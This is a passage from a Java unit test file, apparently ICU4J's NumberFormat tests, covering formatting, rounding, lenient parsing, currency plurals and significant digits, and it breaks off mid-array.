Tests when \"else if (number instanceof com.ibm.icu.math.BigDecimal)\" is true\n        try {\n            nf.format((Object)new com.ibm.icu.math.BigDecimal(\"0\"), sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"return an exception for a com.ibm.icu.math.BigDecimal object. Error: \" + e);\n        }\n\n        // Tests when \"else if (number instanceof CurrencyAmount)\" is true\n        try {\n            CurrencyAmount ca = new CurrencyAmount(0.0, Currency.getInstance(new ULocale(\"en_US\")));\n            nf.format((Object)ca, sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"return an exception for a CurrencyAmount object. Error: \" + e);\n        }\n\n        // Tests when \"else if (number instanceof Number)\" is true\n        try {\n            nf.format(0.0, sb, fp);\n        } catch (Exception e) {\n            errln(\"NumberFormat.format(Object number, ...) was not suppose to \"\n                    + \"to return an exception for a Number object. Error: \" + e);\n        }\n\n        // Tests when \"else\" is true\n        try {\n            nf.format(new Object(), sb, fp);\n            errln(\"NumberFormat.format(Object number, ...) was suppose to \"\n                    + \"return an exception for an invalid object.\");\n        } catch (Exception e) {\n        }\n\n        try {\n            nf.format(new String(\"dummy\"), sb, fp);\n            errln(\"NumberFormat.format(Object number, ...) was suppose to \"\n                    + \"return an exception for an invalid object.\");\n        } catch (Exception e) {\n        }\n    }\n\n    /*\n     * Coverage tests for the implementation of abstract format methods not being called otherwise\n     */\n    @Test\n    public void TestFormatAbstractImplCoverage() {\n        NumberFormat df = DecimalFormat.getInstance(Locale.ENGLISH);\n        NumberFormat cdf = CompactDecimalFormat.getInstance(Locale.ENGLISH, CompactDecimalFormat.CompactStyle.SHORT);\n        NumberFormat rbf = new RuleBasedNumberFormat(ULocale.ENGLISH, RuleBasedNumberFormat.SPELLOUT);\n\n        /*\n         *  Test  NumberFormat.format(BigDecimal,StringBuffer,FieldPosition)\n         */\n        StringBuffer sb = new StringBuffer();\n        String result = df.format(new BigDecimal(2000.43), sb, new FieldPosition(0)).toString();\n        if (!\"2,000.43\".equals(result)) {\n            errln(\"DecimalFormat failed. Expected: 2,000.43 - Actual: \" + result);\n        }\n\n        sb.delete(0, sb.length());\n        result = cdf.format(new BigDecimal(2000.43), sb, new FieldPosition(0)).toString();\n        if (!\"2K\".equals(result)) {\n            errln(\"DecimalFormat failed. Expected: 2K - Actual: \" + result);\n        }\n\n        sb.delete(0, sb.length());\n        result = rbf.format(new BigDecimal(2000.43), sb, new FieldPosition(0)).toString();\n        if (!\"two thousand point four three\".equals(result)) {\n            errln(\"DecimalFormat failed. Expected: 'two thousand point four three' - Actual: '\" + result + \"'\");\n        }\n    }\n\n    /*\n     * Tests the method public final static NumberFormat getInstance(int style) public static NumberFormat\n     * getInstance(Locale inLocale, int style) public static NumberFormat getInstance(ULocale desiredLocale, int choice)\n     */\n    @Test\n    public void TestGetInstance() {\n        // Tests \"public final static NumberFormat getInstance(int style)\"\n        int maxStyle = NumberFormat.STANDARDCURRENCYSTYLE;\n\n        int[] invalid_cases = { NumberFormat.NUMBERSTYLE - 1, NumberFormat.NUMBERSTYLE - 2,\n                maxStyle + 1, maxStyle + 2 };\n\n        for (int i = NumberFormat.NUMBERSTYLE; i < maxStyle; i++) {\n            try {\n                NumberFormat.getInstance(i);\n            } catch (Exception e) {\n                errln(\"NumberFormat.getInstance(int style) was not suppose to \"\n                        + \"return an exception for passing value of \" + i);\n            }\n        }\n\n        for (int i = 0; i < invalid_cases.length; i++) {\n            try {\n                NumberFormat.getInstance(invalid_cases[i]);\n                errln(\"NumberFormat.getInstance(int style) was suppose to \"\n                        + \"return an exception for passing value of \" + invalid_cases[i]);\n            } catch (Exception e) {\n            }\n        }\n\n        // Tests \"public static NumberFormat getInstance(Locale inLocale, int style)\"\n        String[] localeCases = { \"en_US\", \"fr_FR\", \"de_DE\", \"jp_JP\" };\n\n        for (int i = NumberFormat.NUMBERSTYLE; i < maxStyle; i++) {\n            for (int j = 0; j < localeCases.length; j++) {\n                try {\n                    NumberFormat.getInstance(new Locale(localeCases[j]), i);\n                } catch (Exception e) {\n                    errln(\"NumberFormat.getInstance(Locale inLocale, int style) was not suppose to \"\n                            + \"return an exception for passing value of \" + localeCases[j] + \", \" + i);\n                }\n            }\n        }\n\n        // Tests \"public static NumberFormat getInstance(ULocale desiredLocale, int choice)\"\n        // Tests when \"if (choice < NUMBERSTYLE || choice > PLURALCURRENCYSTYLE)\" is true\n        for (int i = 0; i < invalid_cases.length; i++) {\n            try {\n                NumberFormat.getInstance((ULocale) null, invalid_cases[i]);\n                errln(\"NumberFormat.getInstance(ULocale inLocale, int choice) was not suppose to \"\n                        + \"return an exception for passing value of \" + invalid_cases[i]);\n            } catch (Exception e) {\n            }\n        }\n    }\n\n    /*\n     * Tests the class public static abstract class NumberFormatFactory\n     */\n    @Test\n    public void TestNumberFormatFactory() {\n        /*\n         * The following class allows the method public NumberFormat createFormat(Locale loc, int formatType) to be\n         * tested.\n         */\n        class TestFactory extends NumberFormatFactory {\n            @Override\n            public Set<String> getSupportedLocaleNames() {\n                return null;\n            }\n\n            @Override\n            public NumberFormat createFormat(ULocale loc, int formatType) {\n                return null;\n            }\n        }\n\n        /*\n         * The following class allows the method public NumberFormat createFormat(ULocale loc, int formatType) to be\n         * tested.\n         */\n        class TestFactory1 extends NumberFormatFactory {\n            @Override\n            public Set<String> getSupportedLocaleNames() {\n                return null;\n            }\n\n            @Override\n            public NumberFormat createFormat(Locale loc, int formatType) {\n                return null;\n            }\n        }\n\n        TestFactory tf = new TestFactory();\n        TestFactory1 tf1 = new TestFactory1();\n\n        /*\n         * Tests the method public boolean visible()\n         */\n        if (tf.visible() != true) {\n            errln(\"NumberFormatFactory.visible() was suppose to return true.\");\n        }\n\n        /*\n         * Tests the method public NumberFormat createFormat(Locale loc, int formatType)\n         */\n        if (tf.createFormat(new Locale(\"\"), 0) != null) {\n            errln(\"NumberFormatFactory.createFormat(Locale loc, int formatType) \" + \"was suppose to return null\");\n        }\n\n        /*\n         * Tests the method public NumberFormat createFormat(ULocale loc, int formatType)\n         */\n        if (tf1.createFormat(new ULocale(\"\"), 0) != null) {\n            errln(\"NumberFormatFactory.createFormat(ULocale loc, int formatType) \" + \"was suppose to return null\");\n        }\n    }\n\n    /*\n     * Tests the class public static abstract class SimpleNumberFormatFactory extends NumberFormatFactory\n     */\n    @Test\n    public void TestSimpleNumberFormatFactory() {\n        class TestSimpleNumberFormatFactory extends SimpleNumberFormatFactory {\n            /*\n             * Tests the method public SimpleNumberFormatFactory(Locale locale)\n             */\n            TestSimpleNumberFormatFactory() {\n                super(new Locale(\"\"));\n            }\n        }\n        @SuppressWarnings(\"unused\")\n        TestSimpleNumberFormatFactory tsnff = new TestSimpleNumberFormatFactory();\n    }\n\n    /*\n     * Tests the method public static ULocale[] getAvailableLocales()\n     */\n    @SuppressWarnings(\"static-access\")\n    @Test\n    public void TestGetAvailableLocales() {\n        // Tests when \"if (shim == null)\" is true\n        @SuppressWarnings(\"serial\")\n        class TestGetAvailableLocales extends NumberFormat {\n            @Override\n            public StringBuffer format(double number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(long number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(BigInteger number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(java.math.BigDecimal number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(BigDecimal number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public Number parse(String text, ParsePosition parsePosition) {\n                return null;\n            }\n        }\n\n        try {\n            TestGetAvailableLocales test = new TestGetAvailableLocales();\n            test.getAvailableLocales();\n        } catch (Exception e) {\n            errln(\"NumberFormat.getAvailableLocales() was not suppose to \"\n                    + \"return an exception when getting getting available locales.\");\n        }\n    }\n\n    /*\n     * Tests the method public void setMinimumIntegerDigits(int newValue)\n     */\n    @Test\n    public void TestSetMinimumIntegerDigits() {\n        NumberFormat nf = NumberFormat.getInstance();\n        // For valid array, it is displayed as {min value, max value}\n        // Tests when \"if (minimumIntegerDigits > maximumIntegerDigits)\" is true\n        int[][] cases = { { -1, 0 }, { 0, 1 }, { 1, 0 }, { 2, 0 }, { 2, 1 }, { 10, 0 } };\n        int[] expectedMax = { 1, 1, 0, 0, 1, 0 };\n        if (cases.length != expectedMax.length) {\n            errln(\"Can't continue test case method TestSetMinimumIntegerDigits \"\n                    + \"since the test case arrays are unequal.\");\n        } else {\n            for (int i = 0; i < cases.length; i++) {\n                nf.setMinimumIntegerDigits(cases[i][0]);\n                nf.setMaximumIntegerDigits(cases[i][1]);\n                if (nf.getMaximumIntegerDigits() != expectedMax[i]) {\n                    errln(\"NumberFormat.setMinimumIntegerDigits(int newValue \"\n                            + \"did not return an expected result for parameter \" + cases[i][0] + \" and \" + cases[i][1]\n                                    + \" and expected \" + expectedMax[i] + \" but got \" + nf.getMaximumIntegerDigits());\n                }\n            }\n        }\n    }\n\n    /*\n     * Tests the method public int getRoundingMode() public void setRoundingMode(int roundingMode)\n     */\n    @Test\n    public void TestRoundingMode() {\n        @SuppressWarnings(\"serial\")\n        class TestRoundingMode extends NumberFormat {\n            @Override\n            public StringBuffer format(double number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(long number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(BigInteger number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(java.math.BigDecimal number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public StringBuffer format(BigDecimal number, StringBuffer toAppendTo, FieldPosition pos) {\n                return null;\n            }\n\n            @Override\n            public Number parse(String text, ParsePosition parsePosition) {\n                return null;\n            }\n        }\n        TestRoundingMode tgrm = new TestRoundingMode();\n\n        // Tests the function 'public void setRoundingMode(int roundingMode)'\n        try {\n            tgrm.setRoundingMode(0);\n            errln(\"NumberFormat.setRoundingMode(int) was suppose to return an exception\");\n        } catch (Exception e) {\n        }\n\n        // Tests the function 'public int getRoundingMode()'\n        try {\n            tgrm.getRoundingMode();\n            errln(\"NumberFormat.getRoundingMode() was suppose to return an exception\");\n        } catch (Exception e) {\n        }\n    }\n\n    /*\n     * Testing lenient decimal/grouping separator parsing\n     */\n    @Test\n    public void TestLenientSymbolParsing() {\n        DecimalFormat fmt = new DecimalFormat();\n        DecimalFormatSymbols sym = new DecimalFormatSymbols();\n\n        expect(fmt, \"12\\u300234\", 12.34);\n\n        // Ticket#7345 - case 1\n        // Even strict parsing, the decimal separator set in the symbols\n        // should be successfully parsed.\n\n        sym.setDecimalSeparator('\\u3002');\n\n        // non-strict\n        fmt.setDecimalFormatSymbols(sym);\n\n        // strict - failed before the fix for #7345\n        fmt.setParseStrict(true);\n        expect(fmt, \"23\\u300245\", 23.45);\n        fmt.setParseStrict(false);\n\n\n        // Ticket#7345 - case 2\n        // Decimal separator variants other than DecimalFormatSymbols.decimalSeparator\n        // should not hide the grouping separator DecimalFormatSymbols.groupingSeparator.\n        sym.setDecimalSeparator('.');\n        sym.setGroupingSeparator(',');\n        fmt.setDecimalFormatSymbols(sym);\n\n        expect(fmt, \"1,234.56\", 1234.56);\n\n        sym.setGroupingSeparator('\\uFF61');\n        fmt.setDecimalFormatSymbols(sym);\n\n        expect(fmt, \"2\\uFF61345.67\", 2345.67);\n\n        // Ticket#7128\n        //\n        sym.setGroupingSeparator(',');\n        fmt.setDecimalFormatSymbols(sym);\n\n        String skipExtSepParse = ICUConfig.get(\"com.ibm.icu.text.DecimalFormat.SkipExtendedSeparatorParsing\", \"false\");\n        if (skipExtSepParse.equals(\"true\")) {\n            // When the property SkipExtendedSeparatorParsing is true,\n            // DecimalFormat does not use the extended equivalent separator\n            // data and only uses the one in DecimalFormatSymbols.\n            expect(fmt, \"23 456\", 23);\n        } else {\n            // Lenient separator parsing is enabled by default.\n            // A space character below is interpreted as a\n            // group separator, even ',' is used as grouping\n            // separator in the symbols.\n            expect(fmt, \"12 345\", 12345);\n        }\n    }\n\n    /*\n     * Testing currency driven max/min fraction digits problem\n     * reported by ticket#7282\n     */\n    @Test\n    public void TestCurrencyFractionDigits() {\n        double value = 99.12345;\n\n        // Create currency instance\n        NumberFormat cfmt  = NumberFormat.getCurrencyInstance(new ULocale(\"ja_JP\"));\n        String text1 = cfmt.format(value);\n\n        // Reset the same currency and format the test value again\n        cfmt.setCurrency(cfmt.getCurrency());\n        String text2 = cfmt.format(value);\n\n        // output1 and output2 must be identical\n        if (!text1.equals(text2)) {\n            errln(\"NumberFormat.format() should return the same result - text1=\"\n                    + text1 + \" text2=\" + text2);\n        }\n    }\n\n    /*\n     * Testing rounding to negative zero problem\n     * reported by ticket#7609\n     */\n    @Test\n    public void TestNegZeroRounding() {\n\n        DecimalFormat df = (DecimalFormat) NumberFormat.getInstance();\n        df.setRoundingMode(MathContext.ROUND_HALF_UP);\n        df.setMinimumFractionDigits(1);\n        df.setMaximumFractionDigits(1);\n        String text1 = df.format(-0.01);\n\n        df.setRoundingIncrement(0.1);\n        String text2 = df.format(-0.01);\n\n        // output1 and output2 must be identical\n        if (!text1.equals(text2)) {\n            errln(\"NumberFormat.format() should return the same result - text1=\"\n                    + text1 + \" text2=\" + text2);\n        }\n\n    }\n\n    @Test\n    public void TestCurrencyAmountCoverage() {\n        CurrencyAmount ca, cb;\n\n        try {\n            ca = new CurrencyAmount(null, (Currency) null);\n            errln(\"NullPointerException should have been thrown.\");\n        } catch (NullPointerException ex) {\n        }\n        try {\n            ca = new CurrencyAmount(new Integer(0), (Currency) null);\n            errln(\"NullPointerException should have been thrown.\");\n        } catch (NullPointerException ex) {\n        }\n\n        ca = new CurrencyAmount(new Integer(0), Currency.getInstance(new ULocale(\"ja_JP\")));\n        cb = new CurrencyAmount(new Integer(1), Currency.getInstance(new ULocale(\"ja_JP\")));\n        if (ca.equals(null)) {\n            errln(\"Comparison should return false.\");\n        }\n        if (!ca.equals(ca)) {\n            errln(\"Comparision should return true.\");\n        }\n        if (ca.equals(cb)) {\n            errln(\"Comparison should return false.\");\n        }\n    }\n\n    @Test\n    public void TestExponentParse() {\n        ParsePosition parsePos = new ParsePosition(0);\n        DecimalFormatSymbols symbols = new DecimalFormatSymbols(Locale.US);\n        DecimalFormat fmt = new DecimalFormat(\"#####\", symbols);\n        Number result = fmt.parse(\"5.06e-27\", parsePos);\n        if ( result.doubleValue() != 5.06E-27 || parsePos.getIndex() != 8) {\n            errln(\"ERROR: ERROR: parse failed - expected 5.06E-27, 8; got \" + result.doubleValue() + \", \" + parsePos.getIndex());\n        }\n    }\n\n    @Test\n    public void TestExplicitParents() {\n        // We use these for testing because decimal and grouping separators will be inherited from es_419\n        // starting with CLDR 2.0\n        String[] DATA = {\n                \"es\", \"CO\", \"\", \"1.250,75\",\n                \"es\", \"ES\", \"\", \"1.250,75\",\n                \"es\", \"GQ\", \"\", \"1.250,75\",\n                \"es\", \"MX\", \"\", \"1,250.75\",\n                \"es\", \"US\", \"\", \"1,250.75\",\n                \"es\", \"VE\", \"\", \"1.250,75\",\n\n        };\n\n        for (int i=0; i<DATA.length; i+=4) {\n            Locale locale = new Locale(DATA[i], DATA[i+1], DATA[i+2]);\n            NumberFormat fmt = NumberFormat.getInstance(locale);\n            String s = fmt.format(1250.75);\n            if (s.equals(DATA[i+3])) {\n                logln(\"Ok: 1250.75 x \" + locale + \" => \" + s);\n            } else {\n                errln(\"FAIL: 1250.75 x \" + locale + \" => \" + s +\n                        \", expected \" + DATA[i+3]);\n            }\n        }\n    }\n\n    /*\n     * Test case for #9240\n     * ICU4J 49.1 DecimalFormat did not clone the internal object holding\n     * formatted text attribute information properly. Therefore, DecimalFormat\n     * created by cloning may return incorrect results or may throw an exception\n     * when formatToCharacterIterator is invoked from multiple threads.\n     */\n    @Test\n    public void TestFormatToCharacterIteratorThread() {\n        final int COUNT = 10;\n\n        DecimalFormat fmt1 = new DecimalFormat(\"#0\");\n        DecimalFormat fmt2 = (DecimalFormat)fmt1.clone();\n\n        int[] res1 = new int[COUNT];\n        int[] res2 = new int[COUNT];\n\n        Thread t1 = new Thread(new FormatCharItrTestThread(fmt1, 1, res1));\n        Thread t2 = new Thread(new FormatCharItrTestThread(fmt2, 100, res2));\n\n        t1.start();\n        t2.start();\n\n        try {\n            t1.join();\n            t2.join();\n        } catch (InterruptedException e) {\n            //TODO\n        }\n\n        int val1 = res1[0];\n        int val2 = res2[0];\n\n        for (int i = 0; i < COUNT; i++) {\n            if (res1[i] != val1) {\n                errln(\"Inconsistent first run limit in test thread 1\");\n            }\n            if (res2[i] != val2) {\n                errln(\"Inconsistent first run limit in test thread 2\");\n            }\n        }\n    }\n\n    /*\n     * This feature had to do with a limitation in DigitList.java that no longer exists in the\n     * new implementation.\n     *\n    @Test\n    public void TestParseMaxDigits() {\n        DecimalFormat fmt = new DecimalFormat();\n        String number = \"100000000000\";\n        int newParseMax = number.length() - 1;\n\n        fmt.setParseMaxDigits(-1);\n\n        // Default value is 1000\n        if (fmt.getParseMaxDigits() != 1000) {\n            errln(\"Fail valid value checking in setParseMaxDigits.\");\n        }\n\n        try {\n            if (fmt.parse(number).doubleValue() == Float.POSITIVE_INFINITY) {\n                errln(\"Got Infinity but should NOT when parsing number: \" + number);\n            }\n\n            fmt.setParseMaxDigits(newParseMax);\n\n            if (fmt.parse(number).doubleValue() != Float.POSITIVE_INFINITY) {\n                errln(\"Did not get Infinity but should when parsing number: \" + number);\n            }\n        } catch (ParseException ex) {\n\n        }\n    }\n    */\n\n    private static class FormatCharItrTestThread implements Runnable {\n        private final NumberFormat fmt;\n        private final int num;\n        private final int[] result;\n\n        FormatCharItrTestThread(NumberFormat fmt, int num, int[] result) {\n            this.fmt = fmt;\n            this.num = num;\n            this.result = result;\n        }\n\n        @Override\n        public void run() {\n            for (int i = 0; i < result.length; i++) {\n                AttributedCharacterIterator acitr = fmt.formatToCharacterIterator(num);\n                acitr.first();\n                result[i] = acitr.getRunLimit();\n            }\n        }\n    }\n\n    @Test\n    public void TestRoundingBehavior() {\n        final Object[][] TEST_CASES = {\n                {\n                    ULocale.US,                             // ULocale - null for default locale\n                    \"#.##\",                                 // Pattern\n                    Integer.valueOf(BigDecimal.ROUND_DOWN), // Rounding Mode or null (implicit)\n                    Double.valueOf(0.0d),                   // Rounding increment, Double or BigDecimal, or null (implicit)\n                    Double.valueOf(123.4567d),              // Input value, Long, Double, BigInteger or BigDecimal\n                    \"123.45\"                                // Expected result, null for exception\n                },\n                {\n                    ULocale.US,\n                    \"#.##\",\n                    null,\n                    Double.valueOf(0.1d),\n                    Double.valueOf(123.4567d),\n                    \"123.5\"\n                },\n                {\n                    ULocale.US,\n                    \"#.##\",\n                    Integer.valueOf(BigDecimal.ROUND_DOWN),\n                    Double.valueOf(0.1d),\n                    Double.valueOf(123.4567d),\n                    \"123.4\"\n                },\n                {\n                    ULocale.US,\n                    \"#.##\",\n                    Integer.valueOf(BigDecimal.ROUND_UNNECESSARY),\n                    null,\n                    Double.valueOf(123.4567d),\n                    null\n                },\n                {\n                    ULocale.US,\n                    \"#.##\",\n                    Integer.valueOf(BigDecimal.ROUND_DOWN),\n                    null,\n                    Long.valueOf(1234),\n                    \"1234\"\n                },\n        };\n\n        int testNum = 1;\n\n        for (Object[] testCase : TEST_CASES) {\n            // 0: locale\n            // 1: pattern\n            ULocale locale = testCase[0] == null ? ULocale.getDefault() : (ULocale)testCase[0];\n            String pattern = (String)testCase[1];\n\n            DecimalFormat fmt = new DecimalFormat(pattern, DecimalFormatSymbols.getInstance(locale));\n\n            // 2: rounding mode\n            Integer roundingMode = null;\n            if (testCase[2] != null) {\n                roundingMode = (Integer)testCase[2];\n                fmt.setRoundingMode(roundingMode);\n            }\n\n            // 3: rounding increment\n            if (testCase[3] != null) {\n                if (testCase[3] instanceof Double) {\n                    fmt.setRoundingIncrement((Double)testCase[3]);\n                } else if (testCase[3] instanceof BigDecimal) {\n                    fmt.setRoundingIncrement((BigDecimal)testCase[3]);\n                } else if (testCase[3] instanceof java.math.BigDecimal) {\n                    fmt.setRoundingIncrement((java.math.BigDecimal)testCase[3]);\n                }\n            }\n\n            // 4: input number\n            String s = null;\n            boolean bException = false;\n            try {\n                s = fmt.format(testCase[4]);\n            } catch (ArithmeticException e) {\n                bException = true;\n            }\n\n            if (bException) {\n                if (testCase[5] != null) {\n                    errln(\"Test case #\" + testNum + \": ArithmeticException was thrown.\");\n                }\n            } else {\n                if (testCase[5] == null) {\n                    errln(\"Test case #\" + testNum +\n                            \": ArithmeticException must be thrown, but got formatted result: \" +\n                            s);\n                } else {\n                    assertEquals(\"Test case #\" + testNum, testCase[5], s);\n                }\n            }\n\n            testNum++;\n        }\n    }\n\n    @Test\n    public void TestSignificantDigits() {\n        double input[] = {\n                0, 0,\n                123, -123,\n                12345, -12345,\n                123.45, -123.45,\n                123.44501, -123.44501,\n                0.001234, -0.001234,\n                0.00000000123, -0.00000000123,\n                0.0000000000000000000123, -0.0000000000000000000123,\n                1.2, -1.2,\n                0.0000000012344501, -0.0000000012344501,\n                123445.01, -123445.01,\n                12344501000000000000000000000000000.0, -12344501000000000000000000000000000.0,\n        };\n        String[] expected = {\n                \"0.00\", \"0.00\",\n                \"123\", \"-123\",\n                \"12345\", \"-12345\",\n                \"123.45\", \"-123.45\",\n                \"123.45\", \"-123.45\",\n                \"0.001234\", \"-0.001234\",\n                \"0.00000000123\", \"-0.00000000123\",\n                \"0.0000000000000000000123\", \"-0.0000000000000000000123\",\n                \"1.20\", \"-1.20\",\n                \"0.0000000012345\", \"-0.0000000012345\",\n                \"123450\", \"-123450\",\n                \"12345000000000000000000000000000000\", \"-12345000000000000000000000000000000\",\n        };\n        DecimalFormat numberFormat =\n                (DecimalFormat) NumberFormat.getInstance(ULocale.US);\n        numberFormat.setSignificantDigitsUsed(true);\n        numberFormat.setMinimumSignificantDigits(3);\n        numberFormat.setMaximumSignificantDigits(5);\n        numberFormat.setGroupingUsed(false);\n        for (int i = 0; i < input.length; i++) {\n            assertEquals(\"TestSignificantDigits\", expected[i], numberFormat.format(input[i]));\n        }\n\n        // Test for ICU-20063\n        {\n            DecimalFormat df = new DecimalFormat(\"0.######\", DecimalFormatSymbols.getInstance(ULocale.US));\n            df.setSignificantDigitsUsed(true);\n            expect(df, 9.87654321, \"9.87654\");\n            df.setMaximumSignificantDigits(3);\n            expect(df, 9.87654321, \"9.88\");\n            // setSignificantDigitsUsed with maxSig only\n            df.setSignificantDigitsUsed(true);\n            expect(df, 9.87654321, \"9.88\");\n            df.setMinimumSignificantDigits(2);\n            expect(df, 9, \"9.0\");\n            // setSignificantDigitsUsed with both minSig and maxSig\n            df.setSignificantDigitsUsed(true);\n            expect(df, 9, \"9.0\");\n            // setSignificantDigitsUsed to false: should revert to fraction rounding\n            df.setSignificantDigitsUsed(false);\n            expect(df, 9.87654321, \"9.876543\");\n            expect(df, 9, \"9\");\n            df.setSignificantDigitsUsed(true);\n            df.setMinimumSignificantDigits(2);\n            expect(df, 9.87654321, \"9.87654\");\n            expect(df, 9, \"9.0\");\n            // setSignificantDigitsUsed with minSig only\n            df.setSignificantDigitsUsed(true);\n            expect(df, 9.87654321, \"9.87654\");\n            expect(df, 9, \"9.0\");\n        }\n    }\n\n    @Test\n    public void TestBug9936() {\n        DecimalFormat numberFormat =\n                (DecimalFormat) NumberFormat.getInstance(ULocale.US);\n        assertFalse(\"\", numberFormat.areSignificantDigitsUsed());\n\n        numberFormat.setSignificantDigitsUsed(true);\n        assertTrue(\"\", numberFormat.areSignificantDigitsUsed());\n\n        numberFormat.setSignificantDigitsUsed(false);\n        assertFalse(\"\", numberFormat.areSignificantDigitsUsed());\n\n        numberFormat.setMinimumSignificantDigits(3);\n        assertTrue(\"\", numberFormat.areSignificantDigitsUsed());\n\n        numberFormat.setSignificantDigitsUsed(false);\n        numberFormat.setMaximumSignificantDigits(6);\n        assertTrue(\"\", numberFormat.areSignificantDigitsUsed());\n    }\n\n    @Test\n    public void TestShowZero() {\n        DecimalFormat numberFormat =\n                (DecimalFormat) NumberFormat.getInstance(ULocale.US);\n        numberFormat.setSignificantDigitsUsed(true);\n        numberFormat.setMaximumSignificantDigits(3);\n        assertEquals(\"TestShowZero\", \"0\", numberFormat.format(0.0));\n    }\n\n    @Test\n    public void TestCurrencyPlurals() {\n        String[][] tests = {\n                {\"en\", \"USD\", \"1\", \"1 US dollar\"},\n                {\"en\", \"USD\", \"1.0\", \"1.0 US dollars\"},\n                {\"en\", \"USD\", \"1.00\", \"1.00 US dollars\"},\n                {\"en\", \"USD\", \"1.99\", \"1.99 US dollars\"},\n                {\"en\", \"AUD\", \"1\", \"1 Australian dollar\"},\n                {\"en\", \"AUD\", \"1.00\", \"1.00 Australian dollars\"},\n                {\"sl\", \"USD\", \"1\", \"1 ameri\\u0161ki dolar\"},\n                {\"sl\", \"USD\", \"2\", \"2 ameri\\u0161ka dolarja\"},\n                {\"sl\", \"USD\", \"3\", \"3 ameri\\u0161ki dolarji\"},\n                {\"sl\", \"USD\", \"5\", \"5 ameriških dolarjev\"},\n                {\"fr\", \"USD\", \"1.99\", \"1,99 dollar des États-Unis\"},\n                {\"ru\", \"RUB\", \"1\", \"1 \\u0440\\u043E\\u0441\\u0441\\u0438\\u0439\\u0441\\u043A\\u0438\\u0439 \\u0440\\u0443\\u0431\\u043B\\u044C\"},\n                {\"ru\", \"RUB\", \"2\", \"2 \\u0440\\u043E\\u0441\\u0441\\u0438\\u0439\\u0441\\u043A\\u0438\\u0445 \\u0440\\u0443\\u0431\\u043B\\u044F\"},\n                {\"ru\", \"RUB\", \"5\", \"5 \\u0440\\u043E\\u0441\\u0441\\u0438\\u0439\\u0441\\u043A\\u0438\\u0445 \\u0440\\u0443\\u0431\\u043B\\u0435\\u0439\"},\n        };\n        for (String test[] : tests) {\n            DecimalFormat numberFormat = (DecimalFormat) DecimalFormat.getInstance(new ULocale(test[0]), NumberFormat.PLURALCURRENCYSTYLE);\n            numberFormat.setCurrency(Currency.getInstance(test[1]));\n            double number = Double.parseDouble(test[2]);\n            int dotPos = test[2].indexOf('.');\n            int decimals = dotPos < 0 ? 0 : test[2].length() - dotPos - 1;\n            int digits = dotPos < 0 ? test[2].length() : test[2].length() - 1;\n            numberFormat.setMaximumFractionDigits(decimals);\n            numberFormat.setMinimumFractionDigits(decimals);\n            String actual = numberFormat.format(number);\n            assertEquals(test[0] + \"\\t\" + test[1] + \"\\t\" + test[2], test[3], actual);\n            numberFormat.setMaximumSignificantDigits(digits);\n            numberFormat.setMinimumSignificantDigits(digits);\n            actual = numberFormat.format(number);\n            assertEquals(test[0] + \"\\t\" + test[1] + \"\\t\" + test[2], test[3], actual);\n        }\n    }\n\n    @Test\n    public void TestCustomCurrencySignAndSeparator() {\n        DecimalFormatSymbols custom = new DecimalFormatSymbols(ULocale.US);\n\n        custom.setCurrencySymbol(\"*\");\n        custom.setMonetaryGroupingSeparator('^');\n        custom.setMonetaryDecimalSeparator(':');\n\n        DecimalFormat fmt = new DecimalFormat(\"\\u00A4 #,##0.00\", custom);\n\n        final String numstr = \"* 1^234:56\";\n        expect2(fmt, 1234.56, numstr);\n    }\n\n    @Test\n    public void TestParseSignsAndMarks() {\n        class SignsAndMarksItem {\n            public String locale;\n            public boolean lenient;\n            public String numString;\n            public double value;\n             // Simple constructor\n            public SignsAndMarksItem(String loc, boolean lnt, String numStr, double val) {\n                locale = loc;\n                lenient = lnt;\n                numString = numStr;\n                value = val;\n            }\n        };\n        final SignsAndMarksItem[] items = {\n            // *** Note, ICU4J lenient number parsing does not handle arbitrary whitespace, but can\n            // treat some whitespace as a grouping separator. The cases marked *** below depend\n            // on isGroupingUsed() being set for the locale, which in turn depends on grouping\n            // separators being present in the decimalFormat pattern for the locale (& num sys).\n            //\n            //                    locale                lenient numString                               value\n            new SignsAndMarksItem(\"en\",                 false,  \"12\",                                    12 ),\n            new SignsAndMarksItem(\"en\",                 true,   \"12\",                                    12 ),\n            new SignsAndMarksItem(\"en\",                 false,  \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"en\",                 true,   \"-23\",                                  -23 ),\n            new SignsAndMarksItem(\"en\",                 true,   \"- 23\",                                 -23 ), // ***\n            new SignsAndMarksItem(\"en\",                 false,  \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"en\",                 true,   \"\\u200E-23\",                            -23 ),\n            new SignsAndMarksItem(\"en\",                 true,   \"\\u200E- 23\",                           -23 ), // ***\n\n            new SignsAndMarksItem(\"en@numbers=arab\",    false,  \"\\u0663\\u0664\",                          34 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    true,   \"\\u0663\\u0664\",                          34 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    false,  \"-\\u0664\\u0665\",                        -45 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    true,   \"-\\u0664\\u0665\",                        -45 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    true,   \"- \\u0664\\u0665\",                       -45 ), // ***\n            new SignsAndMarksItem(\"en@numbers=arab\",    false,  \"\\u200F-\\u0664\\u0665\",                  -45 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    true,   \"\\u200F-\\u0664\\u0665\",                  -45 ),\n            new SignsAndMarksItem(\"en@numbers=arab\",    true,   \"\\u200F- \\u0664\\u0665\",                 -45 ), // ***\n\n            new 